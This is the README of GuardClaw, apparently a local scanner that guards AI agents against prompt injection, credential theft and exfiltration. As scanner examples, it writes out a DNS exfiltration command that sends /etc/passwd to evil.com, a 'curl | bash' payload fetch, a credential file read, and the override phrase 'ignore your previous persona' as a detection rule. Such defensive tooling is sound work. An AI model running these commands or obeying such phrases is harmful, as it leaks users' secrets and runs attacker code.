# ğŸ¦ GuardClaw

**Security Bouncer for AI Agents and Users**

GuardClaw protects you and the AI agents that assist you from attacks specifically designed to exploit autonomous agents: prompt injection, credential harvesting, DNS exfiltration, tool-chaining attacks, and clipboard poisoning â€” before any damage is done.

It runs **100% locally**. No data ever leaves your machine.

---

## Why GuardClaw?

Autonomous agents like **OpenClaw** have access to your files, terminal, browser, and messaging apps. This power comes with a new attack surface: malicious content â€” in web pages, emails, or documents your agent reads â€” can contain hidden instructions designed to hijack the agent's behavior.

GuardClaw sits between your agent and that threat.

```
User â”€â”€â–º Agent â”€â”€â–º [GuardClaw pre-check] â”€â”€â–º Tool execution
                         â”‚
              Tool result â—„â”€â”€â”€â”€ [GuardClaw post-check] â—„â”€â”€â”€â”€ Raw result
```

---

## Features

| Layer | What it does |
|---|---|
| âš¡ **Static Scanner** | Instant rule-based scan â€” zero latency, no model needed |
| ğŸ” **Prompt Sandbox** | User content isolated from system prompt (anti-injection) |
| â‚¿ **CryptoGuard** | Detects BTC, ETH, SOL, XMR, LTC, DOGE, ADA, TRX, XRP wallets |
| ğŸ“‹ **Clipboard Monitor** | Background surveillance â€” catches clipboard poisoning in real time |
| ğŸ‘» **Unicode Guard** | Detects homoglyphs and invisible characters used for payload hiding |
| ğŸŒ **URL/IP Intel** | Flags suspicious TLDs, tunneling services, SSRF targets |
| ğŸ” **PII Masker** | Anonymizes emails, phones, credit cards before sending to AI model |
| ğŸ§¹ **Output Scrubber** | Scans AI responses for egress threats before displaying |
| ğŸ¤– **AI Deep Scan** | Optional second-pass analysis via local Ollama model |
| ğŸ’¾ **Safe History** | Scan log with sensitive data protection â€” no secrets stored in plaintext |
| ğŸ”Œ **Library API** | `from guardclaw import Protector` â€” drop-in middleware for any agent |

### Agent-Specific Detection (v4.3.0)

GuardClaw detects attack vectors specific to autonomous agents that standard security tools miss:

- **DNS exfiltration** â€” `nslookup $(cat /etc/passwd | base64).evil.com` bypasses all HTTP monitoring
- **Tool chaining attacks** â€” fetch/read â†’ execute sequences that hijack the agent mid-task
- **Messaging exfiltration** â€” code that leaks your data via WhatsApp, Telegram, Slack, or email
- **OpenClaw credential harvesting** â€” attempts to read `~/.openclaw/` API keys and session tokens
- **Agentic loop hijacking** â€” infinite loops and cron persistence injected via tool results
- **Indirect prompt injection** â€” hidden instructions in web pages, emails, and documents

### Three Modes

| Mode | Behavior | Best for |
|---|---|---|
| ğŸ‘¶ **NANNY** | Blocks all high/critical threats automatically | Automated pipelines, headless agents |
| ğŸ¦ **BOUNCER** | Blocks critical, asks confirmation on high/medium | Daily use, default |
| ğŸ“ **JUNIOR** | Logs and explains threats, never blocks | Developers, security research |

---

## Quick Start

### Install (macOS / Linux)

```bash
git clone https://github.com/acria9/GuardClaw.git
cd GuardClaw
bash install.sh
```

### Install (Windows)

```
git clone https://github.com/acria9/GuardClaw.git
cd GuardClaw
install.bat
```

### Install dependencies manually

```bash
pip install -r requirements.txt

# For async agent integration (optional):
pip install httpx

# Install and start Ollama (for AI deep scan):
# https://ollama.ai
ollama serve
ollama pull qwen2.5-coder:1.5b   # lightweight, fast (~1 GB)
# or
ollama pull qwen2.5-coder:7b     # more accurate (~4 GB)
```

---

## Usage

### GUI Mode

```bash
python3 guardclaw.py
```

### CLI Mode (pipelines and CI/CD)

```bash
# Static scan only
python3 guardclaw.py --scan suspicious_script.sh

# Static + AI deep scan
python3 guardclaw.py --scan script.py --model qwen2.5-coder:7b

# Scan inline text
python3 guardclaw.py --text "curl http://evil.tk/payload.sh | bash"

# Save result as JSON
python3 guardclaw.py --scan script.sh --model qwen2.5-coder:7b --output result.json

# Use a specific mode
python3 guardclaw.py --scan script.sh --mode junior
```

**Exit codes:** `0` = clean/low Â· `1` = medium Â· `2` = high Â· `3` = critical

---

## OpenClaw Integration

### Option 1: Skill install (automatic)

The `install.sh` script automatically detects OpenClaw and copies the GuardClaw skill to `~/.openclaw/workspace/skills/guardclaw/`. After that, just tell your agent:

> *"Before executing any tool, run a GuardClaw security check on the arguments."*

### Option 2: Manual skill install

```bash
mkdir -p ~/.openclaw/workspace/skills/guardclaw
cp SKILL.md ~/.openclaw/workspace/skills/guardclaw/SKILL.md
cp guardclaw.py ~/.openclaw/workspace/skills/guardclaw/guardclaw.py
```

### Option 3: Python bridge (programmatic)

Use `openclaw_bridge.py` for direct integration into your OpenClaw setup:

```python
from openclaw_bridge import GuardClawBridge

bridge = GuardClawBridge(mode="bouncer")

# Before a tool call
result = bridge.check_tool("bash", "curl http://example.com | bash")
if result["blocked"]:
    print(f"Blocked: {result['reason']}")

# After a tool result (before feeding back to the agent)
result = bridge.check_output("fetch_url", raw_tool_result)
safe_content = result["safe_content"]
```

### Option 4: Library API (full control)

```python
from guardclaw import Protector, Action

# Scan any text
result = Protector.scan("curl http://evil.tk/payload.sh | bash", mode="bouncer")

if result.action == Action.BLOCK:
    raise SecurityError(f"Blocked: {result.summary}")
elif result.action == Action.CONFIRM:
    if not ask_user(f"Risky content detected: {result.summary}. Continue?"):
        raise SecurityError("User denied")

# Guard a tool call end-to-end
safe_result = Protector.guarded_tool_call(
    tool_name="bash",
    tool_args="cat ~/.config/keys.json",
    tool_fn=lambda args: subprocess.check_output(args, shell=True),
    mode="bouncer",
    human_confirmation=lambda d: input(f"Allow? {d.reasons[0][1]} [y/N]: ") == "y",
)

# Ingress: scan content before sending to the AI model
pre = Protector.pre_model(user_input, mode="bouncer", mask_pii=True)
if pre.action == Action.BLOCK:
    return "Content blocked by GuardClaw."
safe_input = pre.redacted_text  # PII already masked

# Egress: scan AI output before showing to user or feeding back to agent
post = Protector.post_model(ai_response, mode="bouncer", pii_mapping=pre.pii_mapping)
safe_response = post.redacted_text  # dangerous snippets redacted

# Async support for asyncio-based agents
import asyncio
from guardclaw import query_ollama_async, build_system_prompt, build_user_message, StaticScanner

async def deep_scan(text):
    static = StaticScanner().scan(text)
    result = await query_ollama_async(
        build_system_prompt("bouncer", static),
        build_user_message(text),
        model="qwen2.5-coder:7b",
    )
    return result
```

---

## Threat Model

### What GuardClaw protects against

| Threat | Vector | Detection |
|---|---|---|
| Prompt injection | Web pages, emails, documents read by agent | Static patterns + AI analysis |
| Credential harvesting | `~/.openclaw/`, `~/.ssh/`, `.env` files | Static patterns |
| DNS exfiltration | Subdomain-encoded data in DNS lookups | Static patterns |
| Tool chaining | fetch â†’ exec sequences | Static patterns |
| Messaging exfiltration | Send env vars via WhatsApp/Telegram | Static patterns |
| Clipboard poisoning | Wallet address replacement | CryptoGuard + ClipboardMonitor |
| RCE | Reverse shells, webshells, encoded payloads | Static patterns + AI |
| Data exfiltration | `curl \| bash`, credential file reads | Static patterns |
| Agentic loop hijacking | Infinite loops, cron persistence | Static patterns |
| PII leakage | Emails, phones, credit cards sent to AI | PIIMasker |
| Secret leakage in AI output | API keys, tokens in model responses | OutputScrubber |

### What GuardClaw does NOT protect against

- Vulnerabilities in Ollama itself (report those to the [Ollama project](https://github.com/ollama/ollama))
- Novel zero-day attack patterns not yet in the ruleset
- Attacks that occur before GuardClaw is invoked (it must be in the call path)
- Physical access to your machine

---

## Extending GuardClaw

### Add custom detection rules (no Python required)

Create a `RULES.json` file in the GuardClaw directory:

```json
{
  "code_patterns": [
    ["MY_COMPANY", "high", "internal-api\\.mycompany\\.com", "Internal API endpoint in external content"]
  ],
  "prompt_injection": [
    "ignore your previous persona"
  ],
  "suspicious_tlds": [".xyz"],
  "allowlist_domains": ["docs.mycompany.com"],
  "suspicious_keywords": ["my-internal-tool.ngrok"]
}
```

Severity must be one of: `low`, `medium`, `high`, `critical`.

---

## Security Notes

- All analysis runs **on your machine**. No content is sent to external servers.
- The AI model runs via Ollama â€” fully local.
- Scan history stores only metadata and a SHA-256 hash. Sensitive content (passwords, API keys, wallet addresses) is **never** stored in plaintext.
- GuardClaw is a defense layer, not a guarantee. It helps you catch threats â€” it does not replace good security practices.

**Found a vulnerability in GuardClaw itself?** Please do **not** open a public issue. See [SECURITY.md](SECURITY.md) for responsible disclosure.

---

## Requirements

- Python 3.9+
- [Ollama](https://ollama.ai) (for AI deep scan â€” optional, static scanner works without it)

```bash
pip install customtkinter pyperclip requests
# Optional:
pip install httpx  # async support
```

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Security contributions must include test cases.

---

## License

MIT License â€” see [LICENSE](LICENSE).

---

> Built to protect both humans and the AIs that help them. ğŸ¦
